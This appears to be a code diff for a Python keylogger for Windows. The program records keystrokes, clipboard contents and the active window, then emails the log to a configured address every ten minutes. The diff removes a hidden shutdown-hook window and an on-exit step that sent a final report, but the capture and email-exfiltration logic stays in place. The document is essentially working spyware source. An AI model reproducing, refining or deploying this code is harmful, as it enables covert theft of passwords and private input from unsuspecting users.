@@ -3,16 +3,11 @@ import sys
 import time
 import smtplib
 import threading
-import atexit
 from ctypes import windll, byref, create_unicode_buffer, c_ulong
 import tkinter as tk
 from tkinter import simpledialog, messagebox
 from pynput import keyboard
 import win32clipboard
-import win32gui
-import win32con
-
-logger_instance = None
 
 class EmailSender:
     def __init__(self, email, app_password):
@@ -45,40 +40,28 @@ class KeyLogger:
         self.use_email = use_email 
         self.email = email
         self.sender = EmailSender(email, password) if use_email else None
-        self.interval = 600 # 10 minutes
-
-        if self.use_email:
-            atexit.register(self.final_report)
-
-    def send_log_logic(self, is_final=False):
-        """Core logic for reading and transmitting logs."""
-        if not self.use_email or not os.path.exists(self.log_path):
-            return
-
-        try:
-            with open(self.log_path, "r", encoding="utf-8") as f:
-                log_content = f.read()
-            
-            if log_content.strip() and "--- Log reset" not in log_content.strip()[:20]:
-                subject = f"Keylogger Report {'[FINAL]' if is_final else ''} - {time.ctime()}"
-                success = self.sender.send(subject, log_content)
-                
-                if success:
-                    with open(self.log_path, "w", encoding="utf-8") as f:
-                        f.write(f"--- Log reset after email at {time.ctime()} ---\n")
-        except Exception:
-            pass
+        self.interval = 600 #10min.
 
     def report(self):
         """Timer-based reporting loop."""
-        self.send_log_logic()
+        if not self.use_email:
+            return
+
+        if os.path.exists(self.log_path):
+            try:
+                with open(self.log_path, "r", encoding="utf-8") as f:
+                    log_content = f.read()
+                if log_content.strip():
+                    success = self.sender.send(f"Keylogger Report - {time.ctime()}", log_content)
+                    if success:
+                        with open(self.log_path, "w", encoding="utf-8") as f:
+                            f.write(f"--- Log reset after email at {time.ctime()} ---\n")
+            except Exception:
+                pass
+        
         timer = threading.Timer(self.interval, self.report)
         timer.daemon = True
         timer.start()
-
-    def final_report(self):
-        """Emergency transmission: triggered on system shutdown or script exit."""
-        self.send_log_logic(is_final=True)
 
     def get_current_process(self):
         """Captures window info using Unicode Windows API."""
@@ -101,7 +84,7 @@ class KeyLogger:
                 self.kernel32.CloseHandle(h_process)
 
     def on_press(self, key):
-        """Event handler for keystrokes and clipboard monitoring."""
+        """Event handler for keystrokes and clipboard."""
         self.get_current_process()
         content = ""
         try:
@@ -134,13 +117,6 @@ class KeyLogger:
         with keyboard.Listener(on_press=self.on_press) as listener:
             listener.join()
 
-def shutdown_handler(hwnd, msg, wparam, lparam):
-    """Hidden window proc to catch system shutdown signals."""
-    if msg == win32con.WM_QUERYENDSESSION:
-        if logger_instance:
-            logger_instance.final_report()
-    return True
-
 def get_user_config():
     """GUI dialog for user configuration."""
     root = tk.Tk()
@@ -168,19 +144,8 @@ if __name__ == '__main__':
     email, password, use_email = get_user_config()
     
     if use_email is not None:
-        logger_instance = KeyLogger(email, password, use_email)
-        
-        if use_email:
-            wc = win32gui.WNDCLASS()
-            wc.lpfnWndProc = shutdown_handler
-            wc.lpszClassName = "ShutdownListenerWindow"
-            hinst = wc.hInstance = win32gui.GetModuleHandle(None)
-            class_atom = win32gui.RegisterClass(wc)
-            hwnd = win32gui.CreateWindow(
-                class_atom, "ShutdownListener", 0, 0, 0, 0, 0, 0, 0, hinst, None
-            )
-
+        logger = KeyLogger(email, password, use_email)
         try:
-            logger_instance.run()
+            logger.run()
         except (KeyboardInterrupt, SystemExit):
             pass
